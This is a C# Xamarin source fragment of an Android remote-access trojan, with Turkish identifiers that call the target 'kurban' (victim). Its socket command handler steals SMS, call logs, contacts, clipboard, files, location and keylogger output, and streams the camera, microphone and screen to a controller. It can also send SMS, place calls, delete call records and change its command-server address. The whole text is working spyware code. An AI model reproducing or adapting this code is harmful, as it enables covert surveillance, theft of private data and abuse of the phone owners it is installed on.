                    string[] ayirici = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                    try
                    {
                        switch (ayirici[0])
                        {
                            case "DOWNFILE":
                                DosyaIndir(ayirici[1], ayirici[2]);
                                break;
                            case "FOCUSELIVE":
                                Android.Hardware.Camera.Parameters pr_ = Prev.mCamera.GetParameters();
                                IList<string> supportedFocusModes = pr_.SupportedFocusModes;
                                if (supportedFocusModes != null)
                                {
                                    if (ayirici[1] == "1")
                                    {
                                        if (supportedFocusModes.Contains(Android.Hardware.Camera.Parameters.FocusModeContinuousVideo))
                                        {
                                            //Toast.MakeText(this, "FOCUS VIDEO", ToastLength.Long).Show();
                                            pr_.FocusMode = Android.Hardware.Camera.Parameters.FocusModeContinuousVideo;
                                        }
                                    }
                                    else
                                    {
                                        if (supportedFocusModes.Contains(Android.Hardware.Camera.Parameters.FocusModeAuto))
                                        {
                                            //Toast.MakeText(this, "FOCUS AUTO", ToastLength.Long).Show();
                                            pr_.FocusMode = Android.Hardware.Camera.Parameters.FocusModeAuto;
                                        }
                                    }
                                    Prev.mCamera.SetParameters(pr_);
                                }
                                break;
                            case "LIVESTREAM":
                                string kamera = ayirici[1];
                                string flashmode = ayirici[2];
                                string cozunurluk = ayirici[3];
                                MainValues.quality = ayirici[4];
                                string focus = ayirici[5];
                                Prev.global_cam.StartCamera(int.Parse(kamera), flashmode, cozunurluk, focus);
                                break;
                            case "LIVEFLASH":
                                Android.Hardware.Camera.Parameters pr = Prev.mCamera.GetParameters();
                                IList<string> flashmodlari = pr.SupportedFlashModes;
                                if (flashmodlari != null)
                                {
                                    if (ayirici[1] == "1")
                                    {
                                        if (flashmodlari.Contains(Android.Hardware.Camera.Parameters.FlashModeTorch))
                                        {
                                            pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeTorch;
                                        }
                                        else if (flashmodlari.Contains(Android.Hardware.Camera.Parameters.FlashModeRedEye))
                                        {
                                            pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeRedEye;
                                        }
                                    }
                                    else
                                    {
                                        if (flashmodlari.Contains(Android.Hardware.Camera.Parameters.FlashModeOff))
                                        {
                                            pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeOff;
                                        }
                                    }
                                    Prev.mCamera.SetParameters(pr);
                                }
                                break;
                            case "QUALITY":
                                MainValues.quality = ayirici[1];
                                break;
                            case "LIVESTOP":
                                Prev.global_cam.StopCamera();
                                break;
                            case "ZOOM":
                                Android.Hardware.Camera.Parameters _pr_ = Prev.mCamera.GetParameters();
                                _pr_.Zoom = int.Parse(ayirici[1]);
                                Prev.mCamera.SetParameters(_pr_);
                                break;
                            case "CAMHAZIRLA":
                                if (PackageManager.HasSystemFeature(PackageManager.FeatureCameraAny))
                                {
                                    kameraCozunurlukleri();
                                }
                                else
                                {
                                    soketimizeGonder("NOCAMERA", "[VERI][0x09]");
                                }
                                break;
                            case "DOSYABYTE":
                                try
                                {
                                    File.WriteAllBytes(ayirici[3] + "/" + ayirici[2], Convert.FromBase64String(ayirici[1]));
                                    soketimizeGonder("DOSYAALINDI", "[VERI]" + MainValues.KRBN_ISMI + "[VERI][0x09]");
                                }
                                catch (Exception) { }
                                break;
                            case "DELETE":
                                try { DeleteFile_(ayirici[1]); } catch (Exception) { }
                                break;
                            case "BLUETOOTH":
                                btKapaAc(Convert.ToBoolean(ayirici[1]));
                                break;
                            case "CALLLOGS":
                                telefonLogu();
                                break;
                            case "PRE":
                                preview(ayirici[1]);
                                break;
                            case "WIFI":
                                wifiAcKapa(Convert.ToBoolean(ayirici[1]));
                                break;
                            case "ANASAYFA":
                                try
                                {
                                    Intent i = new Intent(Intent.ActionMain);
                                    i.AddCategory(Intent.CategoryHome);
                                    i.SetFlags(ActivityFlags.NewTask);
                                    StartActivity(i);
                                }
                                catch (Exception) { }
                                break;
                            case "GELENKUTUSU":
                                smsLogu("gelen");
                                break;
                            case "GIDENKUTUSU":
                                smsLogu("giden");
                                break;
                            case "UYARI":
                                break;
                            case "KONUS":
                                konus(ayirici[1]);
                                break;
                            case "UNIQ":
                                MainValues.uniq_id = ayirici[1];
                                break;
                            case "CAM":
                                MainValues.front_back = ayirici[1];
                                MainValues.flashMode = ayirici[2];
                                MainValues.resolution = ayirici[3];
                                kameraCek(Soketimiz);
                                break;
                            case "DOSYA":
                                dosyalar();
                                break;
                            case "FOLDERFILE":
                                allDirectory_ = new List<string>();
                                sonAsama(ayirici[1]);
                                cihazDosyalariGonder();
                                break;
                            case "FILESDCARD":
                                allDirectory_ = new List<string>();
                                listf(ayirici[1]);
                                dosyalariGonder();
                                break;
                            case "INDIR":
                                try
                                {
                                    byte[] dosya = File.ReadAllBytes(ayirici[1]);
                                    soketimizeGonder("UZUNLUK", "[VERI]" + Convert.ToBase64String(dosya) + "[VERI]" + ayirici[1].Substring(ayirici[1].LastIndexOf("/") + 1) + "[VERI]" + MainValues.KRBN_ISMI + "_" + GetIdentifier() + "[VERI][0x09]");
                                }
                                catch (Exception) { }
                                break;
                            case "MIC":
                                switch (ayirici[1])
                                {
                                    case "BASLA":
                                        micSend(ayirici[2], ayirici[3]);
                                        break;
                                    case "DURDUR":
                                        micStop();
                                        break;
                                }
                                break;
                            case "KEYBASLAT":
                                key_gonder = true;
                                break;
                            case "KEYDUR":
                                key_gonder = false;
                                break;
                            case "LOGLARIHAZIRLA":
                                log_dosylari_gonder = "";
                                DirectoryInfo dinfo = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                                FileInfo[] fileInfos = dinfo.GetFiles("*.tht");
                                if (fileInfos.Length > 0)
                                {
                                    foreach (FileInfo fileInfo in fileInfos)
                                    {
                                        log_dosylari_gonder += fileInfo.Name + "=";
                                    }
                                    soketimizeGonder("LOGDOSYA", "[VERI]" + log_dosylari_gonder + "[VERI][0x09]");
                                }
                                else
                                {
                                    soketimizeGonder("LOGDOSYA", "[VERI]LOG_YOK[VERI][0x09]");
                                }
                                break;
                            case "KEYCEK":
                                string icerik = File.ReadAllText(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" + ayirici[1]).Replace(System.Environment.NewLine, "[NEW_LINE]");
                                soketimizeGonder("KEYGONDER", "[VERI]" + icerik + "[VERI][0x09]");
                                break;
                            case "DOSYAAC":
                                Ac(ayirici[1]);
                                break;
                            case "GIZLI":
                                StartPlayer(ayirici[1]);
                                break;
                            case "GIZKAPA":
                                if (player != null)
                                {
                                    player.Stop();
                                }
                                break;
                            case "VOLUMELEVELS":
                                sesBilgileri();
                                break;
                            case "ZILSESI":
                                try
                                {
                                    if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                    mgr.SetStreamVolume(Android.Media.Stream.Ring, int.Parse(ayirici[1].Replace("VOLUMELEVELS", "")), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                                }
                                catch (Exception) { }
                                break;
                            case "MEDYASESI":
                                try
                                {
                                    if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                    mgr.SetStreamVolume(Android.Media.Stream.Music, int.Parse(ayirici[1].Replace("VOLUMELEVELS", "")), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                                }
                                catch (Exception) { }
                                break;
                            case "BILDIRIMSESI":
                                try
                                {
                                    if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                    mgr.SetStreamVolume(Android.Media.Stream.Notification, int.Parse(ayirici[1].Replace("VOLUMELEVELS", "")), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                                }
                                catch (Exception) { }
                                break;
                            case "REHBERIVER":
                                rehberLogu();
                                break;
                            case "REHBERISIM":
                                string[] ayir = ayirici[1].Split('=');
                                rehberEkle(ayir[1], ayir[0]);
                                break;
                            case "REHBERSIL":
                                rehberNoSil(ayirici[1]);
                                break;
                            case "VIBRATION":
                                try
                                {
                                    Vibrator vibrator = (Vibrator)GetSystemService(VibratorService);
                                    vibrator.Vibrate(int.Parse(ayirici[1]));
                                }
                                catch (Exception) { }
                                break;
                            case "FLASH":
                                flashIsik(ayirici[1]);
                                break;
                            case "TOST":
                                Toast.MakeText(this, ayirici[1], ToastLength.Long).Show();
                                break;
                            case "APPLICATIONS":
                                uygulamalar();
                                break;
                            case "OPENAPP":
                                try
                                {
                                    Intent intent = PackageManager.GetLaunchIntentForPackage(ayirici[1]);
                                    intent.AddFlags(ActivityFlags.NewTask);
                                    StartActivity(intent);
                                }
                                catch (Exception) { }
                                break;
                            case "DELETECALL":
                                DeleteCallLogByNumber(ayirici[1]);
                                break;
                            case "SARJ":
                                try
                                {
                                    var filter = new IntentFilter(Intent.ActionBatteryChanged);
                                    var battery = RegisterReceiver(null, filter);
                                    int level = battery.GetIntExtra(BatteryManager.ExtraLevel, -1);
                                    int scale = battery.GetIntExtra(BatteryManager.ExtraScale, -1);
                                    int BPercetage = (int)Math.Floor(level * 100D / scale);
                                    var per = BPercetage.ToString();
                                    soketimizeGonder("TELEFONBILGI", "[VERI]" + per.ToString() + "[VERI]" + ekranDurumu() + "[VERI]" + usbDurumu()
                                     + "[VERI]" + mobil_Veri() + "[VERI]" + wifi_durumu() + "[VERI]" + gps_durum() + "[VERI]" + btisEnabled() + "[VERI]"+fetchAllInfo()+"[VERI][0x09]");
                                }
                                catch (Exception) { }
                                break;
                            case "UPDATE":
                                try
                                {
                                    Preferences.Set("aypi_adresi", ayirici[2]);
                                    Preferences.Set("port", ayirici[3]);
                                    Preferences.Set("kurban_adi", ayirici[1]);
                                    Preferences.Set("pass", ayirici[4]);
                                    PASSWORD = Preferences.Get("pass", string.Empty);
                                    MainValues.IP = Preferences.Get("aypi_adresi", "192.168.1.7");
                                    MainValues.port = int.Parse(Preferences.Get("port", "9999"));
                                    MainValues.KRBN_ISMI = Preferences.Get("kurban_adi", "xxxx");
                                }
                                catch (Exception) { }
                                break;
                            case "WALLPAPERBYTE":
                                try
                                {
                                    duvarKagidi(ayirici[1]);
                                }
                                catch (Exception) { }
                                break;
                            case "WALLPAPERGET":
                                duvarKagidiniGonder();
                                break;
                            case "PANOGET":
                                panoyuYolla();
                                break;
                            case "PANOSET":
                                panoAyarla(ayirici[1]);
                                break;
                            case "SMSGONDER":
                                string[] baki = ayirici[1].Split('=');
                                try
                                {
                                    SmsManager.Default.SendTextMessage(baki[0], null,
                                           baki[1], null, null);
                                }
                                catch (Exception) { }
                                break;
                            case "ARA":
                                MakePhoneCall(ayirici[1]);
                                break;
                            case "URL":
                                try
                                {
                                    var uri = Android.Net.Uri.Parse(ayirici[1]);
                                    var intent = new Intent(Intent.ActionView, uri);
                                    StartActivity(intent);
                                }
                                catch (Exception) { }
                                break;
                            case "KONUM":
                                lokasyonCek();
                                break;
                            case "PARLAKLIK":
                                try { setBrightness(int.Parse(ayirici[1])); } catch (Exception) { }
                                break;
                            case "LOGTEMIZLE":
                                DirectoryInfo dinfo_ = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                                FileInfo[] fileInfos_ = dinfo_.GetFiles("*.tht");
                                if (fileInfos_.Length > 0)
                                {
                                    foreach (FileInfo fileInfo in fileInfos_)
                                    {
                                        fileInfo.Delete();
                                    }
                                }
                                break;
                            case "SHORTCUT":
                                AddShortcut(ayirici[1], ayirici[2], Convert.FromBase64String(ayirici[3]));
                                break;
                            case "SCREENLIVEOPEN":
                                ImageAvailableListener.kalite = int.Parse(ayirici[1].Replace("%", ""));
                                startProjection();
                                break;
                            case "SCREENLIVECLOSE":
                                stopProjection();
                                break;
                            case "SCREENQUALITY":
                                ImageAvailableListener.kalite = int.Parse(ayirici[1].Replace("%", ""));
                                break;
                        }
                    }
                    catch (Exception)
                    {

                    }
                }
            });
        }
        public string GetIdentifier()
        {
            try
            {
                return Settings.Secure.GetString(ContentResolver, Settings.Secure.AndroidId);
            }
            catch (Exception) { return "error_imei"; }
        }
        public string telefondanIsim(string telefon)
        {
            try
            {
                return getContactbyPhoneNumber(this, telefon);
            }
            catch (Exception) { return "Kayıtsız numara"; }
        }
        public string getContactbyPhoneNumber(Context c, string phoneNumber)
        {
            try
            {
                Android.Net.Uri uri = Android.Net.Uri.WithAppendedPath(ContactsContract.PhoneLookup.ContentFilterUri, (phoneNumber));
                string[] projection = { ContactsContract.Contacts.InterfaceConsts.DisplayName };
                ICursor cursor = c.ContentResolver.Query(uri, projection, null, null, null);
                if (cursor == null)
                {
                    return phoneNumber;
                }
                else
                {
                    string name = phoneNumber;
                    try
                    {

                        if (cursor.MoveToFirst())
                        {
                            name = cursor.GetString(cursor.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.DisplayName));
                        }
                    }
                    finally
                    {
                        cursor.Close();
                    }

                    return name;
                }
            }
            catch (Exception) { return "İsim bulunamadı"; }
        }
        public void cihazDosyalariGonder()
        {
            string dosyalarS = "";
            foreach (string inf in allDirectory_)
            {
                dosyalarS += inf + "<";
            }
            if (!string.IsNullOrEmpty(dosyalarS))
            {
                soketimizeGonder("FILES", "[VERI]CIHAZ[VERI]" + dosyalarS + "[VERI][0x09]");
            }
            else
            {
                soketimizeGonder("FILES", "[VERI]CIHAZ[VERI]BOS[VERI][0x09]");
            }
        }
        public void dosyalariGonder()
        {
            string dosyalarS = "";
            foreach (string inf in allDirectory_)
            {
                dosyalarS += inf + "<";
            }
            if (!string.IsNullOrEmpty(dosyalarS))
            {
                soketimizeGonder("FILES", "[VERI]SDCARD[VERI]" + dosyalarS + "[VERI][0x09]");
            }
            else
            {
                soketimizeGonder("FILES", "[VERI]SDCARD[VERI]BOS[VERI][0x09]");
            }
        }
        public string usbDurumu()
        {
            string status = "";
            try
            {
                var source = Battery.PowerSource;
                switch (source)
                {
                    case BatteryPowerSource.Battery:
                        status = "BATTERY";
                        break;
                    case BatteryPowerSource.AC:
                        status = "PLUG";
                        break;
                    case BatteryPowerSource.Usb:
                        status = "USB";
                        break;
                    case BatteryPowerSource.Wireless:
                        status = "WIRELESS";
                        break;
                    case BatteryPowerSource.Unknown:
                        status = "UNKNOWN";
                        break;
                }
                return status + "[VERI]";
            }
            catch (Exception ex) { status = ex.Message + "[VERI]"; return status; }
        }
        public string wifi_durumu()
        {
            try
            {
                WifiManager wifiManager = (WifiManager)(Application.Context.GetSystemService(WifiService));
                if (wifiManager != null)
                {
                    return wifiManager.ConnectionInfo.SSID;
                }
                else
                {
                    return "Wifi not connected.";
                }
            }
            catch (Exception) { return "Wifi not connected."; }
        }

        private void btKapaAc(bool ac_kapa)
        {
            try
            {
                BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.DefaultAdapter;
                if (ac_kapa == false)
                {
                    if (mBluetoothAdapter.IsEnabled)
                    {
                        mBluetoothAdapter.Disable();
                    }
                }
                else
                {
                    if (ac_kapa == true)
                    {
                        if (mBluetoothAdapter.IsEnabled == false)
                        {
                            mBluetoothAdapter.Enable();
                        }
                    }
                }
            }
            catch (Exception) { }
        }
        public void wifiAcKapa(bool acKapa)
        {
            try
            {
                WifiManager wifi = (WifiManager)GetSystemService(WifiService);
                wifi.SetWifiEnabled(acKapa);
            }
            catch (Exception) { }
        }
        public void setBrightness(int brightness)
        {
            if (brightness < 0)
                brightness = 0;
            else if (brightness > 255)
                brightness = 255;
            try
            {
                Settings.System.PutInt(ContentResolver,
                        Settings.System.ScreenBrightnessMode,
                       (int)ScreenBrightness.ModeManual);
            }
            catch (Exception) { }
            ContentResolver cResolver = ContentResolver;
            Settings.System.PutInt(cResolver, Settings.System.ScreenBrightness, brightness);

        }
        public string mobil_Veri()
        {
            try
            {
                Android.Net.ConnectivityManager conMan = (Android.Net.ConnectivityManager)
                    GetSystemService(ConnectivityService);
                //mobile
                var mobile = conMan.GetNetworkInfo(Android.Net.ConnectivityType.Mobile).GetState();

                bool mobileYN = false;
                Context context = this;

                if (Build.VERSION.SdkInt >= BuildVersionCodes.JellyBeanMr1)
                {
                    mobileYN = Settings.Global.GetInt(context.ContentResolver, "mobile_data", 1) == 1;
                }
                else
                {
                    mobileYN = Settings.Secure.GetInt(context.ContentResolver, "mobile_data", 1) == 1;
                }
                return mobileYN ? "Opened/" + ((mobile == Android.Net.NetworkInfo.State.Connected) ? "Internet" : "No Internet") : "Closed";
            }
            catch (Exception ex) { return ex.Message; }
        }
        public string gps_durum()
        {
            LocationManager locationManager = (LocationManager)GetSystemService(LocationService);
            if (locationManager.IsProviderEnabled(LocationManager.GpsProvider))
            {
                return "GPS turned on.";
            }
            else
            {
                return "GPS turned off.";
            }
        }
        private string btisEnabled()
        {
            try
            {
                BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.DefaultAdapter;
                return mBluetoothAdapter.IsEnabled ? "Turned on" : "Turned off";
            }
            catch (Exception ex) { return ex.Message; }
        }
        public string ekranDurumu()
        {
            try
            {
                string KEY_DURUMU = "";
                string EKRAN_DURUMU = "";
                KeyguardManager myKM = (KeyguardManager)GetSystemService(KeyguardService);
                bool isPhoneLocked = myKM.InKeyguardRestrictedInputMode();
                bool isScreenAwake = default;
                KEY_DURUMU = (isPhoneLocked) ? "LOCKED" : "UNLOCKED";
                PowerManager powerManager = (PowerManager)GetSystemService(PowerService);
                isScreenAwake = (int)Build.VERSION.SdkInt < 20 ? powerManager.IsScreenOn : powerManager.IsInteractive;
                EKRAN_DURUMU = isScreenAwake ? "SCREEN ON" : "SCREEN OFF";

                return KEY_DURUMU + "&" + EKRAN_DURUMU + "&";
            }
            catch (Exception ex) { return ex.Message + "&"; }

        }
        public async void panoAyarla(string input)
        {
            await Clipboard.SetTextAsync(input);
        }
        public async void panoyuYolla()
        {
            var pano = await Clipboard.GetTextAsync();
            if (string.IsNullOrEmpty(pano)) { pano = "[NULL]"; }
            try
            {
                soketimizeGonder("PANOGELDI", "[VERI]" + pano + "[VERI][0x09]");
            }
            catch (Exception) { }
        }
        public async Task<byte[]> wallPaper(string linq)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    return await wc.DownloadDataTaskAsync(linq);
                }
            }
            catch (Exception)
            {

                return new byte[] { };
            }
        }
        public async void duvarKagidi(string yol)
        {

            try
            {
                byte[] uzant = await wallPaper(yol);
                if (uzant.Length > 0)
                {
                    Android.Graphics.Bitmap bitmap = Android.Graphics.BitmapFactory.DecodeByteArray(uzant, 0, uzant.Length); //Android.Graphics.BitmapFactory.DecodeByteArray(veri,0,veri.Length);
                    WallpaperManager manager = WallpaperManager.GetInstance(ApplicationContext);
                    manager.SetBitmap(bitmap);
                    bitmap.Dispose();
                    manager.Dispose();
                }
            }
            catch (Exception)
            { }

        }

        public byte[] ResizeImage(byte[] imageData, float width, float height)
        {
            try
            {
                // Load the bitmap 
                BitmapFactory.Options options = new BitmapFactory.Options();// Create object of bitmapfactory's option method for further option use
                options.InPurgeable = true; // inPurgeable is used to free up memory while required
                Bitmap originalImage = BitmapFactory.DecodeByteArray(imageData, 0, imageData.Length, options);
                float newHeight = 0;
                float newWidth = 0;
                var originalHeight = originalImage.Height;
                var originalWidth = originalImage.Width;
                if (originalHeight > originalWidth)
                {
                    newHeight = height;
                    float ratio = originalHeight / height;
                    newWidth = originalWidth / ratio;
                }
                else
                {
                    newWidth = width;
                    float ratio = originalWidth / width;
                    newHeight = originalHeight / ratio;
                }
                Bitmap resizedImage = Bitmap.CreateScaledBitmap(originalImage, (int)newWidth, (int)newHeight, true);
                originalImage.Recycle();
                using (MemoryStream ms = new MemoryStream())
                {
                    resizedImage.Compress(Bitmap.CompressFormat.Png, 75, ms);
                    resizedImage.Recycle();
                    return ms.ToArray();
                }
            }
            catch (Exception)
            {
                return default;
            }
        }
        public void preview(string resim)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(resim);
                file.SetReadable(true);
                byte[] bit = ResizeImage(File.ReadAllBytes(resim), 150, 150);
                if (bit.Length > 0)
                {
                    soketimizeGonder("PREVIEW", "[VERI]" + Convert.ToBase64String(bit) + "[VERI][0x09]");
                }
            }
            catch (Exception) { }
        }
        public byte[] drawableToByteArray(Drawable d)
        {
            var image = d;
            Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
            byte[] bitmapData;
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 100, ms);
                bitmapData = ms.ToArray();
            }
            return bitmapData;
        }
        public void duvarKagidiniGonder()
        {
            DisplayInfo mainDisplayInfo = DeviceDisplay.MainDisplayInfo;
            WallpaperManager manager = WallpaperManager.GetInstance(this);
            if (manager != null)
            {
                try
                {
                    var image = manager.PeekDrawable();
                    if (image != null)
                    {
                        Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
                        byte[] bitmapData = default;
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 100, ms);
                            bitmapData = ms.ToArray();
                        }
                        string resolution = mainDisplayInfo.Width + " x " + mainDisplayInfo.Height;
                        soketimizeGonder("WALLPAPERBYTES", "[VERI]" + Convert.ToBase64String(bitmapData) + "[VERI]" + resolution + "[VERI][0x09]");
                    }
                    else
                    {
                        soketimizeGonder("WALLERROR", "[VERI]There is no wallpaper has been set.[VERI][0x09]");
                    }
                }
                catch (Exception ex)
                {
                    soketimizeGonder("WALLERROR", $"[VERI]{ex.Message}[VERI][0x09]");
                }
            }
        }
        public async void flashIsik(string ne_yapam)
        {
            try
            {
                switch (ne_yapam)
                {
                    case "AC":
                        await Flashlight.TurnOnAsync();
                        break;
                    case "KAPA":
                        await Flashlight.TurnOffAsync();
                        break;
                }
            }
            catch (Exception) { }
        }
        public void MakePhoneCall(string number)
        {
            try
            {
                var uri = Android.Net.Uri.Parse("tel:" + number);
                Intent intent = new Intent(Intent.ActionCall, uri);
                intent.AddFlags(ActivityFlags.NewTask);
                Application.Context.StartActivity(intent);
            }
            catch (Exception) { }
        }
        public void DeleteCallLogByNumber(string number)
        {
            try
            {
                Android.Net.Uri CALLLOG_URI = Android.Net.Uri.Parse("content://call_log/calls");
                ContentResolver.Delete(CALLLOG_URI, CallLog.Calls.Number + "=?", new string[] { number });
            }
            catch (Exception)
            {
            }
        }
        protected MediaPlayer player = new MediaPlayer();
        public void StartPlayer(string filePath)
        {
            try
            {
                if (player == null)
                {
                    player = new MediaPlayer();
                }
                else
                {
                    Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + filePath);
                    player.Reset();
                    player.SetDataSource(this, uri);
                    player.Prepare();
                    player.Start();
                }
            }
            catch (Exception) { }
        }
        string log_dosylari_gonder = "";
        Android.Media.AudioManager mgr = null;
        public void sesBilgileri()
        {
            string ZIL_SESI = "";
            string MEDYA_SESI = "";
            string BILDIRIM_SESI = "";
            mgr = (Android.Media.AudioManager)GetSystemService(AudioService);
            //Zil sesi
            int max = mgr.GetStreamMaxVolume(Android.Media.Stream.Ring);
            int suankiZilSesi = mgr.GetStreamVolume(Android.Media.Stream.Ring);
            ZIL_SESI = suankiZilSesi.ToString() + "/" + max.ToString();
            //Medya
            int maxMedya = mgr.GetStreamMaxVolume(Android.Media.Stream.Music);
            int suankiMedya = mgr.GetStreamVolume(Android.Media.Stream.Music);
            MEDYA_SESI = suankiMedya.ToString() + "/" + maxMedya.ToString();
            //Bildirim Sesi
            int maxBildirim = mgr.GetStreamMaxVolume(Android.Media.Stream.Notification);
            int suankiBildirim = mgr.GetStreamVolume(Android.Media.Stream.Notification);
            BILDIRIM_SESI = suankiBildirim.ToString() + "/" + maxBildirim.ToString();
            //Ekran Parlaklığı
            int parlaklik = Settings.System.GetInt(ContentResolver,
            Settings.System.ScreenBrightness, 0);

            string gonderilecekler = ZIL_SESI + "=" + MEDYA_SESI + "=" + BILDIRIM_SESI + "=" + parlaklik.ToString() + "=";
            soketimizeGonder("SESBILGILERI", "[VERI]" + gonderilecekler + "[VERI][0x09]");
        }
        public static Activity global_activity = default;
        public static PackageManager global_packageManager = default;

    }
}